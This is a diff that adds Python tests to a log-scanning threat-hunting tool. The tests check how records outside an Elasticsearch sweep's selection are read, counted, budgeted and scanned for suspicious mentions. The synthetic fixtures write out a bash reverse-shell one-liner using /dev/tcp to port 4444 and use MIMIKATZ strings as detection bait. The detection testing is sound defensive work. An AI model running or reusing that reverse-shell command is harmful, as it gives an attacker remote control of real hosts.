@@ -276,3 +276,360 @@ def test_a_windows_record_on_a_network_target_is_offered_and_still_counted_as_no
     assert [scanner.patterns.patterns[row[1]].id for row in scanner.ranked()] == ["mention.test_mimikatz"]
     assert scanner.summary()["by_telemetry"] == {"windows_text": 1}
     scanner.close()
+
+
+# ---- the records outside the sweep's selection --------------------------------------------------------------------
+
+def _value(source: dict, field: str):
+    field = field.removesuffix(".keyword")
+    if field in source:
+        return source[field]
+    node = source
+    for part in field.split("."):
+        if not isinstance(node, dict) or part not in node:
+            return None
+        node = node[part]
+    return node
+
+
+def matches(query: dict, source: dict) -> bool:
+    """A small evaluator of the compiled query shapes the sweep and the residue pass send (the window's range always
+    holds here)."""
+    (kind, body), = query.items()
+    if kind == "bool":
+        if not all(matches(item, source) for key in ("filter", "must") for item in body.get(key, [])):
+            return False
+        if any(matches(item, source) for item in body.get("must_not", [])):
+            return False
+        should = body.get("should", [])
+        return not should or sum(matches(item, source) for item in should) >= body.get("minimum_should_match", 1)
+    if kind == "range":
+        return True
+    if kind == "match_all":
+        return True
+    (field, value), = body.items()
+    actual = _value(source, field)
+    if kind == "term":
+        return actual == value
+    if kind == "terms":
+        return actual in value
+    if kind == "exists":
+        return _value(source, value) is not None
+    if kind == "prefix":
+        return isinstance(actual, str) and actual.startswith(value["value"])
+    raise AssertionError(f"query shape not supported by the test evaluator: {kind}")
+
+
+class QueryES:
+    """Answers histogram, composite, point-in-time and search_after requests from a list of records, honouring each
+    query (filters, should, must_not), so the sweep and the residue pass read what a cluster would give them."""
+
+    def __init__(self, hits):
+        self.hits = hits
+        self.searches: list[dict] = []
+
+    def _matching(self, body):
+        query = body.get("query") or {"match_all": {}}
+        return [hit for hit in self.hits if matches(query, hit["_source"])]
+
+    def __call__(self, request):
+        from urllib.parse import urlparse
+
+        import httpx
+        path = urlparse(str(request.url)).path
+        body = json.loads(request.content) if request.content else {}
+        if request.method == "GET" and path == "/":
+            return httpx.Response(200, json={"version": {"number": "8.15.0"}})
+        if path.endswith("/_pit") and request.method == "POST":
+            return httpx.Response(200, json={"id": "pit-1"})
+        if path == "/_pit" and request.method == "DELETE":
+            return httpx.Response(200, json={"succeeded": True})
+        self.searches.append(body)
+        found = self._matching(body)
+        total = {"value": len(found), "relation": "eq"}
+        shell = {"timed_out": False, "_shards": {"total": 1, "successful": 1, "failed": 0}, "hits": {"total": total,
+                                                                                                    "hits": []}}
+        if "h" in body.get("aggs", {}):
+            shell["aggregations"] = {"h": {"buckets": [{"key_as_string": WINDOW.start.isoformat(),
+                                                         "key": int(WINDOW.start.timestamp() * 1000),
+                                                         "doc_count": len(found)}]}}
+            return httpx.Response(200, json=shell)
+        if "g" in body.get("aggs", {}):
+            (name, source), = body["aggs"]["g"]["composite"]["sources"][0].items()
+            field = source["terms"]["field"]
+            counts: dict = {}
+            for hit in found:
+                key = _value(hit["_source"], field)
+                counts[key] = counts.get(key, 0) + 1
+            shell["aggregations"] = {"g": {"buckets": [{"key": {name: key}, "doc_count": count}
+                                                       for key, count in counts.items()]}}
+            return httpx.Response(200, json=shell)
+        start = int(body["search_after"][1]) + 1 if "search_after" in body else 0
+        size = body.get("size", 1000)
+        page = [{**hit, "sort": [int(T0.timestamp() * 1000), start + n]}
+                for n, hit in enumerate(found[start:start + size])]
+        shell["pit_id"] = "pit-1"
+        shell["hits"]["hits"] = page
+        return httpx.Response(200, json=shell)
+
+
+def _client(hits, **settings):
+    import httpx
+
+    from romulus.config import Settings
+    from romulus.sources.es import ElasticClient
+    transport = QueryES(hits)
+    return ElasticClient(Settings(es_url="http://es.invalid", mention_dir=FIXTURES, **settings),
+                         transport=httpx.MockTransport(transport)), transport
+
+
+def _pass(tmp_path, hits, contract, filters, any_of=(), **settings):
+    from types import SimpleNamespace
+
+    from romulus.hunt.mention_residue import ResiduePass
+    client, transport = _client(hits, **settings)
+    scanner = _scanner(tmp_path)
+    owner = SimpleNamespace(contracts={contract.target: contract}, mentions=scanner, client=client, window=WINDOW,
+                            heartbeat=lambda: None, stop_check=None)
+    ResiduePass(owner, contract.target, list(filters), [list(group) for group in any_of]).run()
+    return scanner, transport
+
+
+def test_a_windows_record_outside_a_network_targets_selection_is_read_and_scanned(tmp_path):
+    from romulus.sources.models import Predicate
+    network = contract_from_types("net-x", {"@timestamp": "date", "event.dataset": "keyword",
+                                            "message": "text"}, role="network")
+    zeek = {"_index": "net-x", "_id": "z1", "_source": {"@timestamp": T0.isoformat(), "event": {
+        "dataset": "zeek.conn"}, "message": "MIMIKATZ in a selected record is the sweep's, not the residue's"}}
+    windows = {"_index": "net-x", "_id": "w1", "_source": {
+        "@timestamp": T0.isoformat(), "agent": {"type": "winlogbeat"}, "host": {"name": "dc1"},
+        "event": {"dataset": "windows.security"},
+        "winlog": {"channel": "Security", "event_id": 4688, "computer_name": "dc1", "record_id": 3},
+        "message": "A new process has been created: m.exe MIMIKATZ"}}
+    scanner, transport = _pass(tmp_path, [zeek, windows], network,
+                               [Predicate(field="event.dataset", op="in", value=["zeek.conn"])])
+    rows = list(scanner.ranked())
+    assert [(scanner.patterns.patterns[row[1]].id, row[2], row[6]) for row in rows] == [
+        ("mention.test_mimikatz", "dc1", "windows_text")]
+    assert "outside the sweep's selection" in json.loads(rows[0][7])["query"]
+    summary = scanner.summary()
+    assert summary["outside_selection"]["targets"]["net-x"] == {
+        "records": 1, "read": 1, "counted": True, "reason": "", "keys_not_read_in_full": 0, "keys": []}
+    assert summary["status"] == SCANNED_ALL
+    # every residue request negates the sweep's selection exactly
+    assert all(body["query"]["bool"]["must_not"] for body in transport.searches)
+    scanner.close()
+
+
+def test_a_selection_that_reads_everything_has_no_residue_and_none_is_fetched(tmp_path):
+    scanner, transport = _pass(tmp_path, [_record(1, {"message": "MIMIKATZ"})], CONTRACT, [])
+    assert transport.searches == [] and scanner.summary()["outside_selection"]["targets"][TARGET]["records"] == 0
+    scanner.close()
+
+
+def test_past_the_budget_small_datasets_are_read_whole_and_the_rest_share_it(tmp_path):
+    from romulus.hunt.mention_residue import allocate
+    from romulus.sources.models import Predicate
+    assert allocate([2, 100, 50], 30) == [2, 14, 14] and allocate([5, 5], 100) == [5, 5]
+    assert allocate([3, 3, 3], 2) == [0, 1, 1]
+    selected = _record(0, {"event": {"dataset": "linux.audit"}, "message": "x"})
+    small = [_record(n, {"event": {"dataset": "small.app"}, "message": f"MIMIKATZ {n}"}, host="h-small")
+             for n in range(1, 3)]
+    big = [_record(n, {"event": {"dataset": "big.app"}, "message": f"line {n}"}, host="h-big")
+           for n in range(10, 60)]
+    scanner, _transport = _pass(tmp_path, [selected, *small, *big], CONTRACT,
+                                [Predicate(field="event.dataset", op="in", value=["linux.audit"])],
+                                mention_residue_records=12)
+    row = scanner.summary()["outside_selection"]["targets"][TARGET]
+    assert (row["records"], row["read"], row["keys_not_read_in_full"]) == (52, 12, 1)
+    assert row["keys"] == [{"key": "big.app", "key_field": "event.dataset", "records": 50, "read": 10,
+                            "not_read": 40}]
+    # the small dataset was read whole: its mention is there
+    assert {row[2] for row in scanner.ranked()} == {"h-small"}
+    summary = scanner.summary()
+    assert summary["status"] == "partial"
+    assert any(reason.startswith(f"{TARGET}: 40 of 52 record(s) outside the sweep's selection were not scanned")
+               and "big.app (40 of 50)" in reason for reason in summary["reasons"])
+    scanner.close()
+
+
+def _sweep(tmp_path, hits, contract, **settings):
+    from romulus.hunt.sweep import Sweep
+    from tests.test_mention_sweep import _repo
+    client, transport = _client(hits, **settings)
+    repo = _repo(tmp_path / "hunt.sqlite")
+    sweep = Sweep(repo, client, "h1", WINDOW, {contract.target: contract}, stage_dir=tmp_path / "stage")
+    sweep.run_target(contract.target)
+    sweep.mention_residue(contract.target)
+    sweep.finalize()
+    return repo, sweep, transport
+
+
+SSHD = {"event": {"dataset": "system.auth"}, "process": {"name": "sshd", "pid": 4},
+        "message": "Accepted password for root from 198.51.100.4 port 51515 ssh2"}
+# a target that cannot search event.module or input.type: the Auditbeat and journald-input shapes cannot be selected
+NARROW = contract_from_types(TARGET, {"@timestamp": "date", "event.dataset": "keyword", "host.name": "keyword",
+                                      "message": "text"})
+
+
+def test_shapes_a_target_cannot_select_are_no_gap_when_nothing_is_outside_the_selection(tmp_path):
+    hits = [_record(1, SSHD), _record(2, {"event": {"dataset": "custom.app"}, "message": f"x {SHELL}"})]
+    repo, sweep, _transport = _sweep(tmp_path, hits, NARROW)
+    stored = repo.mention_scan("h1")
+    # the sweep still lists the shapes for detection coverage; the pool counted the records outside its selection
+    # exactly (none), so they are not a mention gap
+    assert sweep.stats.get("linux_shapes_not_assessed", {}).get(TARGET)
+    assert stored["left_out_sources"] == [] and stored["outside_selection"]["targets"][TARGET]["records"] == 0
+    assert stored["status"] == SCANNED_ALL, stored["reasons"]
+    assert [row["pattern_id"] for row in repo.mentions("h1")] == ["mention.test_dev_tcp_redirect"]
+
+
+def test_a_record_of_a_shape_the_target_cannot_select_is_read_and_scanned(tmp_path):
+    journald_input = {"input": {"type": "journald"}, "process": {"command_line": SHELL, "name": "bash"},
+                      "message": "session opened"}
+    hits = [_record(1, SSHD), _record(2, journald_input, host="db1")]
+    repo, _sweep_run, _transport = _sweep(tmp_path, hits, NARROW)
+    stored = repo.mention_scan("h1")
+    assert stored["outside_selection"]["targets"][TARGET] == {
+        "records": 1, "read": 1, "counted": True, "reason": "", "keys_not_read_in_full": 0, "keys": []}
+    rows = repo.mentions("h1")
+    assert [(row["pattern_id"], row["host"]) for row in rows] == [("mention.test_dev_tcp_redirect", "db1")]
+    assert stored["status"] == SCANNED_ALL, stored["reasons"]
+    # a mention is never a finding, whatever it read
+    assert repo.candidates("h1") == [] or all(row["lane"] != "mention" for row in repo.candidates("h1"))
+
+
+# ---- volume: every family, streamed, bounded memory, exact counts ---------------------------------------------------
+
+def _family_records(count: int, start: int = 0):
+    """Synthetic records of every family, made on the fly; one in 500 holds a pattern in a non-message field."""
+    import random
+    rng = random.Random(7)
+    words = ["session", "opened", "unit", "started", "cron", "eth0", "link", "ok", "pid=41", "uid=0", "lease"]
+    for n in range(start, start + count):
+        bad = n % 500 == 0
+        text = (f"bash -i >& /dev/tcp/10.0.{n % 256}.{n % 199}/4444 0>&1" if bad
+                else " ".join(rng.choice(words) for _ in range(rng.randint(4, 12))) + f" {n % 9973}")
+        kind = n % 5
+        if kind == 0:
+            source = {"message": f"type=PROCTITLE msg=audit(1731938400.{n % 1000:03d}:{n}): proctitle={_hex(text)}"}
+        elif kind == 1:
+            source = {"event": {"original": json.dumps({"MESSAGE": "started", "_CMDLINE": text, "_PID": str(n)})}}
+        elif kind == 2:
+            source = {"event": {"original": json.dumps({"event_type": "http", "src_ip": "10.0.0.1", "flow_id": n,
+                                                        "http": {"url": "/" + text, "hostname": "x.example"}})}}
+        elif kind == 3:
+            source = {"event": {"original": json.dumps({"@timestamp": "t", "process": {"command_line": text}})}}
+        else:
+            source = {"message": "process started", "process": {"command_line": text}}
+        yield {"_index": TARGET, "_id": f"v{n}", "_source": {
+            "@timestamp": (T0 + timedelta(milliseconds=n % 299_000)).isoformat(),
+            "host": {"name": f"host{n % 3000}"}, **source}}
+
+
+def test_a_streamed_scan_of_every_family_keeps_memory_bounded_and_counts_exactly(tmp_path):
+    import os
+
+    from tests.test_mention_sweep import _rss
+    count = int(os.environ.get("ROMULUS_MENTION_FAMILY_SCALE") or 100_000)
+    scanner = MentionScanner("h1", load_mention_patterns(FIXTURES), stage_dir=tmp_path,
+                             window=(WINDOW.start, WINDOW.end), max_per_pattern=2_000, max_per_host=50,
+                             max_per_hunt=5_000)
+    base, peak, chunk = _rss(), 0, []
+    for hit in _family_records(count):
+        title = "type=PROCTITLE" in str(hit["_source"].get("message", ""))
+        chunk.append((hit, "x", False, ("proctitle",)) if title else (hit, "x"))
+        if len(chunk) == 5_000:
+            scanner.scan(TARGET, CONTRACT, chunk, None)
+            chunk = []
+            peak = max(peak, _rss() - base)
+    scanner.scan(TARGET, CONTRACT, chunk, None)
+    summary = scanner.summary()
+    scanner.close()
+    assert summary["records_scanned"] == count and summary["lines_matched"] == count // 500
+    # two texts for the journal (MESSAGE, _CMDLINE), EVE (url, hostname) and message-with-command-line records
+    assert summary["lines_scanned"] == count + 3 * (count // 5)
+    assert set(summary["by_field"]) == {"auditd:PROCTITLE.proctitle", "journald:event.original#journal:MESSAGE",
+                                        "journald:event.original#journal:_CMDLINE",
+                                        "suricata_eve:event.original#eve:http.hostname",
+                                        "suricata_eve:event.original#eve:http.url",
+                                        "ecs_json:event.original#process.command_line", "text:message",
+                                        "text:process.command_line"}
+    assert summary["groups_kept"] <= 5_000 and peak < 96 * 2**20, peak
+
+
+class _PagedClient:
+    """A source of `total` records outside the selection, answered page by page as a point-in-time read would."""
+
+    def __init__(self, total: int):
+        from types import SimpleNamespace
+        self.total = total
+        self.settings = SimpleNamespace(es_flavor="elasticsearch", mention_residue_records=0)
+        self.version = "8.15.0"
+        self.read = 0
+
+    def run(self, q):
+        from romulus.sources.models import Completeness, SearchOutcome
+        now = datetime.now(UTC)
+        return SearchOutcome(target=q.target, fingerprint=q.fingerprint, started_at=now, ended_at=now,
+                             completeness=Completeness.complete, total=self.total, total_relation="eq"), {}
+
+    def search(self, _target, _body):
+        # a count by dataset that does not add up: the budget is then spent on the earliest records
+        return {"hits": {"total": {"value": self.total, "relation": "eq"}}, "aggregations": {"g": {"buckets": []}}}
+
+    def iterate(self, q, max_records):
+        for start in range(0, min(self.total, max_records), 1_000):
+            page = [{"_id": hit["_id"], "_index": hit["_index"], "_source": hit["_source"]}
+                    for hit in _family_records(min(1_000, max_records - start), start)]
+            self.read += len(page)
+            yield page, {"problems": [], "total": self.total, "total_relation": "eq"}
+
+
+def test_the_records_outside_the_selection_are_streamed_within_the_budget(tmp_path):
+    from types import SimpleNamespace
+
+    from romulus.hunt.mention_residue import ResiduePass
+    from romulus.sources.models import Predicate
+    from tests.test_mention_sweep import _rss
+    client = _PagedClient(60_000)
+    client.settings.mention_residue_records = 50_000
+    scanner = _scanner(tmp_path)
+    owner = SimpleNamespace(contracts={TARGET: CONTRACT}, mentions=scanner, client=client, window=WINDOW,
+                            heartbeat=lambda: None, stop_check=None)
+    base = _rss()
+    ResiduePass(owner, TARGET, [Predicate(field="event.dataset", op="in", value=["linux.audit"])], []).run()
+    grown = _rss() - base
+    summary = scanner.summary()
+    row = summary["outside_selection"]["targets"][TARGET]
+    # no exactly searchable key here (the composite answer is not given): the earliest records by time were read
+    assert client.read == 50_000 and (row["records"], row["read"]) == (60_000, 50_000)
+    assert summary["outside_selection"]["offered"] == 50_000 and summary["status"] == "partial"
+    assert any("10,000 of 60,000 record(s) outside the sweep's selection were not scanned" in reason
+               for reason in summary["reasons"])
+    assert grown < 96 * 2**20, grown
+    scanner.close()
+
+
+def test_a_residue_that_cannot_be_counted_leaves_the_left_out_sources_named(tmp_path):
+    from types import SimpleNamespace
+
+    from romulus.hunt.sweep import Sweep
+    scanner = _scanner(tmp_path)
+    scanner.note_residue("logs-a", records=None, read=0, counted=False, reason="count not exact")
+    scanner.note_residue("logs-b", records=0, read=0, counted=True)
+    owner = SimpleNamespace(stats={
+        "linux_shapes_not_assessed": {"logs-a": ["input.type:journald: not searchable on this target"],
+                                      "logs-b": ["input.type:journald: not searchable on this target"]},
+        "dataset_reconciliation": {"logs-b": [
+            {"dataset": "custom", "records": 4, "reason": "not retrieved by the sweep: no normalizer reads this "
+                                                          "dataset, so no rule evaluates it", "count_scope": "x"},
+            {"dataset": "linux.audit", "records": 3, "reason": "not retrieved: selected for retrieval, but the "
+                                                               "sweep's source query did not return these records",
+             "count_scope": "y"}]}}, _windows_selective=set())
+    Sweep._mention_left_out(owner, scanner)
+    assert sorted((item["target"], item["name"]) for item in scanner.left_out) == [
+        ("logs-a", "input.type:journald"), ("logs-b", "linux.audit")]
+    summary = scanner.summary()
+    assert any(reason.startswith("logs-a: count not exact") for reason in summary["reasons"])
+    scanner.close()
